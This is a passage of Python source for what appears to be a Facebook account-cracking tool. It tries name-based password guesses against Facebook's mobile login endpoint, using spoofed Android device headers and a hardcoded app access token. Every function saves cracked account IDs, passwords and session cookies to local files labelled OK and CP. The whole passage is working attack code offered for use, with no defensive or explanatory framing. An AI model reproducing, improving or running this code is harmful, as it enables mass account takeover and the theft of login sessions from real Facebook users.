                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        ua ="[FBAN/FB4A;FBAV/213.0.0.6.27;FBBV/24809374;FBDM/{density=3.0,width=1280,height=1280};FBLC/en_GB;FBCR/Nepal_Telecom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/GT-I9190;FBSV/5.3.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/377.0.0.5.132;FBBV/12237487;FBDM/{density=1.0,width=1080,height=1920};FBLC/en_GB;FBCR/MTN-CG;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/6.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/246.0.0.7.43;FBBV/40043841;FBDM/{density=3.0,width=1280,height=1440};FBLC/en_PK;FBCR/Cellcom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/7.5.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/252.0.0.1.121;FBBV/60446661;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBCR/DOCTYPE;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-T535;FBSV/11.0.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/383.0.0.17.28;FBBV/30483696;FBDM/{density=2.5,width=720,height=1080};FBLC/en_US;FBCR/Nepal_Telecom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/GT-N7100;FBSV/9.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/432.0.0.26.148;FBBV/14615134;FBDM/{density=2.5,width=1080,height=1080};FBLC/en_PK;FBCR/MTN-CG;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-T531;FBSV/10.1.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [OK-BXI] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/QXR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[2F-BXI] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [CP-BXI] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/QXR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/QXR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [BXI-M3] %s| \033[1;37mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = "[FBAN/FB4A;FBAV/342.0.0.7.25;FBBV/28284443;FBDM/{density=1.5,width=1280,height=1920};FBLC/en_GB;FBCR/MTN-CG;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/GT-I9190;FBSV/12.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/442.0.0.17.116;FBBV/30034487;FBDM/{density=3.0,width=1280,height=1920};FBLC/en_US;FBCR/Cellcom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/12.5.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/383.0.0.4.127;FBBV/64366337;FBDM/{density=2.5,width=1280,height=720};FBLC/en_GB;FBCR/Nepal_Telecom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/GT-N7100;FBSV/8.4.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'FBAN/FB4A;FBAV/256.0.0.25.101;FBBV/30727049;FBDM/{density=2.0,width=1280,height=1920};FBLC/en_PK;FBCR/BASE;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-T231;FBSV/6.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/167.0.0.40.23;FBBV/31647550;FBDM/{density=1.0,width=720,height=1080};FBLC/en_US;FBCR/DOCTYPE;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/8.3.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/332.0.0.18.144;FBBV/36332173;FBDM/{density=2.5,width=720,height=1080};FBLC/en_PK;FBCR/Cellcom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/GT-N7100;FBSV/11.3.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/265.0.0.2.34;FBBV/28147000;FBDM/{density=2.5,width=1080,height=1440};FBLC/en_PK;FBCR/MTN-CG;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/7.3.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/300.0.0.21.126;FBBV/32362103;FBDM/{density=2.5,width=720,height=1080};FBLC/en_PK;FBCR/Nepal_Telecom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-T231;FBSV/8.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/220.0.0.3.33;FBBV/53729610;FBDM/{density=2.5,width=1280,height=1280};FBLC/en_GB;FBCR/BASE;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/GT-P5100;FBSV/7.4.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/227.0.0.9.110;FBBV/29918503;FBDM/{density=1.0,width=720,height=1440};FBLC/en_US;FBCR/Cellcom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-J510FN;FBSV/7.4.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [OK-BXI] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/QXR-OK.txt','a').write(ids+'|'+pas+'\n')                                        
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;31m [CP-BXI] '+ids+' | '+pas+'\033[1;97m')                                                
                                                open('/sdcard/QXR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/QXR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [BXI-RAN] %s| \033[1;32mOK \033[1;37m: \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua ="[FBAN/FB4A;FBAV/342.0.0.7.25;FBBV/28284443;FBDM/{density=1.5,width=1280,height=1920};FBLC/en_GB;FBCR/MTN-CG;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/GT-I9190;FBSV/12.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/442.0.0.17.116;FBBV/30034487;FBDM/{density=3.0,width=1280,height=1920};FBLC/en_US;FBCR/Cellcom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/12.5.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/383.0.0.4.127;FBBV/64366337;FBDM/{density=2.5,width=1280,height=720};FBLC/en_GB;FBCR/Nepal_Telecom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/GT-N7100;FBSV/8.4.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'FBAN/FB4A;FBAV/256.0.0.25.101;FBBV/30727049;FBDM/{density=2.0,width=1280,height=1920};FBLC/en_PK;FBCR/BASE;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-T231;FBSV/6.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/167.0.0.40.23;FBBV/31647550;FBDM/{density=1.0,width=720,height=1080};FBLC/en_US;FBCR/DOCTYPE;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/8.3.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/332.0.0.18.144;FBBV/36332173;FBDM/{density=2.5,width=720,height=1080};FBLC/en_PK;FBCR/Cellcom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/GT-N7100;FBSV/11.3.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/265.0.0.2.34;FBBV/28147000;FBDM/{density=2.5,width=1080,height=1440};FBLC/en_PK;FBCR/MTN-CG;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/7.3.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/300.0.0.21.126;FBBV/32362103;FBDM/{density=2.5,width=720,height=1080};FBLC/en_PK;FBCR/Nepal_Telecom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-T231;FBSV/8.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/220.0.0.3.33;FBBV/53729610;FBDM/{density=2.5,width=1280,height=1280};FBLC/en_GB;FBCR/BASE;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/GT-P5100;FBSV/7.4.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/227.0.0.9.110;FBBV/29918503;FBDM/{density=1.0,width=720,height=1440};FBLC/en_US;FBCR/Cellcom;FBMF/relme;FBBD/relme;FBPN/com.facebook.katana;FBDV/SM-J510FN;FBSV/7.4.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [OK-BXI] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                       
                                        open('/sdcard/QXR-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        open('/sdcard/QXR-OK-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[1;31m [CP-BXI] '+str(uid)+' | '+pas+'\033[1;97m')                                     
                                        open('/sdcard/QXR-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
                        
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
menu()

